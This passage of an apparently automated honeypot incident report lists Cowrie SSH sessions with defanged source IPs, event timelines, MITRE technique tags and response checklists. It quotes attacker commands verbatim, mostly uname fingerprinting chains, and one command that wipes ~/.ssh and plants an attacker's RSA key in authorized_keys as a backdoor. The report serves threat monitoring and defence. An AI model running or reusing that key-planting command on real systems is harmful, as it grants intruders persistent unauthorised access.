| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:03:35` | `cowrie.session.connect` |
| `2026-07-19 05:03:36` | `cowrie.client.version` |
| `2026-07-19 05:03:36` | `cowrie.client.kex` |
| `2026-07-19 05:03:37` | `cowrie.login.success` |
| `2026-07-19 05:03:37` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:03:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.141[.]202` to AbuseIPDB if not already reported
- [ ] Block `65.20.141[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-231c744cada9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:03 |
| **Last Seen** | 2026-07-19 05:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:03:39` | `cowrie.session.connect` |
| `2026-07-19 05:03:39` | `cowrie.client.version` |
| `2026-07-19 05:03:39` | `cowrie.client.kex` |
| `2026-07-19 05:03:41` | `cowrie.login.success` |
| `2026-07-19 05:03:42` | `cowrie.session.params` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.success` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.command.input` |
| `2026-07-19 05:03:42` | `cowrie.log.closed` |
| `2026-07-19 05:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf6fe9fee9c

| Field | Detail |
|---|---|
| **Source IP** | `82.193.122[.]91` |
| **First Seen** | 2026-07-19 05:03 |
| **Last Seen** | 2026-07-19 05:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:03:46` | `cowrie.session.connect` |
| `2026-07-19 05:03:47` | `cowrie.client.version` |
| `2026-07-19 05:03:47` | `cowrie.client.kex` |
| `2026-07-19 05:03:47` | `cowrie.login.success` |
| `2026-07-19 05:03:48` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:03:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.193.122[.]91` to AbuseIPDB if not already reported
- [ ] Block `82.193.122[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b27e27f6a8eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:03 |
| **Last Seen** | 2026-07-19 05:04 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:03:48` | `cowrie.session.connect` |
| `2026-07-19 05:03:51` | `cowrie.client.version` |
| `2026-07-19 05:03:51` | `cowrie.client.kex` |
| `2026-07-19 05:04:06` | `cowrie.login.success` |
| `2026-07-19 05:04:18` | `cowrie.session.params` |
| `2026-07-19 05:04:18` | `cowrie.command.input` |
| `2026-07-19 05:04:24` | `cowrie.log.closed` |
| `2026-07-19 05:04:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e957b33211

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:04 |
| **Last Seen** | 2026-07-19 05:04 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:04:05` | `cowrie.session.connect` |
| `2026-07-19 05:04:08` | `cowrie.client.version` |
| `2026-07-19 05:04:08` | `cowrie.client.kex` |
| `2026-07-19 05:04:33` | `cowrie.login.success` |
| `2026-07-19 05:04:45` | `cowrie.session.params` |
| `2026-07-19 05:04:45` | `cowrie.command.input` |
| `2026-07-19 05:04:48` | `cowrie.log.closed` |
| `2026-07-19 05:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2aaeb5c48fa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:04 |
| **Last Seen** | 2026-07-19 05:04 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:04:21` | `cowrie.session.connect` |
| `2026-07-19 05:04:26` | `cowrie.client.version` |
| `2026-07-19 05:04:26` | `cowrie.client.kex` |
| `2026-07-19 05:04:48` | `cowrie.login.success` |
| `2026-07-19 05:04:54` | `cowrie.session.params` |
| `2026-07-19 05:04:54` | `cowrie.command.input` |
| `2026-07-19 05:04:57` | `cowrie.log.closed` |
| `2026-07-19 05:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0a304eb4c3

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-19 05:04 |
| **Last Seen** | 2026-07-19 05:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:04:28` | `cowrie.session.connect` |
| `2026-07-19 05:04:28` | `cowrie.client.version` |
| `2026-07-19 05:04:28` | `cowrie.client.kex` |
| `2026-07-19 05:04:30` | `cowrie.login.success` |
| `2026-07-19 05:04:31` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:04:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb3a990135e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:04 |
| **Last Seen** | 2026-07-19 05:05 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:04:34` | `cowrie.session.connect` |
| `2026-07-19 05:04:41` | `cowrie.client.version` |
| `2026-07-19 05:04:41` | `cowrie.client.kex` |
| `2026-07-19 05:04:54` | `cowrie.login.success` |
| `2026-07-19 05:05:00` | `cowrie.session.params` |
| `2026-07-19 05:05:00` | `cowrie.command.input` |
| `2026-07-19 05:05:05` | `cowrie.log.closed` |
| `2026-07-19 05:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbc4b2473b58

| Field | Detail |
|---|---|
| **Source IP** | `14.48.112[.]8` |
| **First Seen** | 2026-07-19 05:04 |
| **Last Seen** | 2026-07-19 05:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:04:36` | `cowrie.session.connect` |
| `2026-07-19 05:04:37` | `cowrie.client.version` |
| `2026-07-19 05:04:37` | `cowrie.client.kex` |
| `2026-07-19 05:04:39` | `cowrie.login.success` |
| `2026-07-19 05:04:40` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.48.112[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.48.112[.]8` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2858234575

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:04 |
| **Last Seen** | 2026-07-19 05:05 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:04:57` | `cowrie.session.connect` |
| `2026-07-19 05:05:00` | `cowrie.client.version` |
| `2026-07-19 05:05:00` | `cowrie.client.kex` |
| `2026-07-19 05:05:21` | `cowrie.login.success` |
| `2026-07-19 05:05:34` | `cowrie.session.params` |
| `2026-07-19 05:05:34` | `cowrie.command.input` |
| `2026-07-19 05:05:44` | `cowrie.log.closed` |
| `2026-07-19 05:05:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24e74f45fb73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:05 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:05:11` | `cowrie.session.connect` |
| `2026-07-19 05:05:16` | `cowrie.client.version` |
| `2026-07-19 05:05:16` | `cowrie.client.kex` |
| `2026-07-19 05:05:45` | `cowrie.login.success` |
| `2026-07-19 05:05:57` | `cowrie.session.params` |
| `2026-07-19 05:05:57` | `cowrie.command.input` |
| `2026-07-19 05:06:01` | `cowrie.log.closed` |
| `2026-07-19 05:06:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-908f4befe030

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:05 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:05:18` | `cowrie.session.connect` |
| `2026-07-19 05:05:25` | `cowrie.client.version` |
| `2026-07-19 05:05:25` | `cowrie.client.kex` |
| `2026-07-19 05:05:53` | `cowrie.login.success` |
| `2026-07-19 05:06:02` | `cowrie.session.params` |
| `2026-07-19 05:06:02` | `cowrie.command.input` |
| `2026-07-19 05:06:07` | `cowrie.log.closed` |
| `2026-07-19 05:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dced8c8cdda

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-19 05:05 |
| **Last Seen** | 2026-07-19 05:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:05:27` | `cowrie.session.connect` |
| `2026-07-19 05:05:27` | `cowrie.client.version` |
| `2026-07-19 05:05:27` | `cowrie.client.kex` |
| `2026-07-19 05:05:29` | `cowrie.login.success` |
| `2026-07-19 05:05:30` | `cowrie.session.params` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.success` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.command.input` |
| `2026-07-19 05:05:30` | `cowrie.log.closed` |
| `2026-07-19 05:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4eaed922c944

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:05 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:05:34` | `cowrie.session.connect` |
| `2026-07-19 05:05:43` | `cowrie.client.version` |
| `2026-07-19 05:05:43` | `cowrie.client.kex` |
| `2026-07-19 05:06:03` | `cowrie.login.success` |
| `2026-07-19 05:06:17` | `cowrie.session.params` |
| `2026-07-19 05:06:17` | `cowrie.command.input` |
| `2026-07-19 05:06:24` | `cowrie.log.closed` |
| `2026-07-19 05:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae79205c9a61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:00` | `cowrie.session.connect` |
| `2026-07-19 05:06:04` | `cowrie.client.version` |
| `2026-07-19 05:06:04` | `cowrie.client.kex` |
| `2026-07-19 05:06:30` | `cowrie.login.success` |
| `2026-07-19 05:06:42` | `cowrie.session.params` |
| `2026-07-19 05:06:42` | `cowrie.command.input` |
| `2026-07-19 05:06:45` | `cowrie.log.closed` |
| `2026-07-19 05:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524eaa5f52e8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:16` | `cowrie.session.connect` |
| `2026-07-19 05:06:21` | `cowrie.client.version` |
| `2026-07-19 05:06:21` | `cowrie.client.kex` |
| `2026-07-19 05:06:43` | `cowrie.login.success` |
| `2026-07-19 05:06:51` | `cowrie.session.params` |
| `2026-07-19 05:06:51` | `cowrie.command.input` |
| `2026-07-19 05:06:54` | `cowrie.log.closed` |
| `2026-07-19 05:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d99f65c3444

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:38` | `cowrie.session.connect` |
| `2026-07-19 05:06:42` | `cowrie.client.version` |
| `2026-07-19 05:06:42` | `cowrie.client.kex` |
| `2026-07-19 05:06:56` | `cowrie.login.success` |
| `2026-07-19 05:07:07` | `cowrie.session.params` |
| `2026-07-19 05:07:07` | `cowrie.command.input` |
| `2026-07-19 05:07:12` | `cowrie.log.closed` |
| `2026-07-19 05:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1dbfe02367e

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:43` | `cowrie.session.connect` |
| `2026-07-19 05:06:43` | `cowrie.client.version` |
| `2026-07-19 05:06:43` | `cowrie.client.kex` |
| `2026-07-19 05:06:44` | `cowrie.login.success` |
| `2026-07-19 05:06:45` | `cowrie.session.params` |
| `2026-07-19 05:06:45` | `cowrie.command.input` |
| `2026-07-19 05:06:45` | `cowrie.command.failed` |
| `2026-07-19 05:06:45` | `cowrie.log.closed` |
| `2026-07-19 05:06:46` | `cowrie.session.params` |
| `2026-07-19 05:06:46` | `cowrie.command.input` |
| `2026-07-19 05:06:46` | `cowrie.session.file_download` |
| `2026-07-19 05:06:46` | `cowrie.log.closed` |
| `2026-07-19 05:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68047de2fd18

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:46` | `cowrie.session.connect` |
| `2026-07-19 05:06:46` | `cowrie.client.version` |
| `2026-07-19 05:06:46` | `cowrie.client.kex` |
| `2026-07-19 05:06:47` | `cowrie.login.success` |
| `2026-07-19 05:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f369db962713

| Field | Detail |
|---|---|
| **Source IP** | `79.104.0[.]82` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:47` | `cowrie.session.connect` |
| `2026-07-19 05:06:47` | `cowrie.client.version` |
| `2026-07-19 05:06:47` | `cowrie.client.kex` |
| `2026-07-19 05:06:48` | `cowrie.login.success` |
| `2026-07-19 05:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.104.0[.]82` to AbuseIPDB if not already reported
- [ ] Block `79.104.0[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0408ca2db113

| Field | Detail |
|---|---|
| **Source IP** | `96.56.228[.]149` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:50` | `cowrie.session.connect` |
| `2026-07-19 05:06:51` | `cowrie.client.version` |
| `2026-07-19 05:06:51` | `cowrie.client.kex` |
| `2026-07-19 05:06:52` | `cowrie.login.success` |
| `2026-07-19 05:06:52` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:06:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.56.228[.]149` to AbuseIPDB if not already reported
- [ ] Block `96.56.228[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026357368f6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]14` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 36s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:53` | `cowrie.session.connect` |
| `2026-07-19 05:06:56` | `cowrie.client.version` |
| `2026-07-19 05:06:56` | `cowrie.client.kex` |
| `2026-07-19 05:07:18` | `cowrie.login.success` |
| `2026-07-19 05:07:26` | `cowrie.session.params` |
| `2026-07-19 05:07:26` | `cowrie.command.input` |
| `2026-07-19 05:07:30` | `cowrie.log.closed` |
| `2026-07-19 05:07:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]14` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb9b152d0844

| Field | Detail |
|---|---|
| **Source IP** | `116.48.150[.]115` |
| **First Seen** | 2026-07-19 05:06 |
| **Last Seen** | 2026-07-19 05:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 05:06:58` | `cowrie.session.connect` |
| `2026-07-19 05:06:58` | `cowrie.client.version` |
| `2026-07-19 05:06:58` | `cowrie.client.kex` |
| `2026-07-19 05:07:00` | `cowrie.login.success` |
| `2026-07-19 05:07:01` | `cowrie.direct-tcpip.request` |
| `2026-07-19 05:07:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.150[.]115` to AbuseIPDB if not already reported
- [ ] Block `116.48.150[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
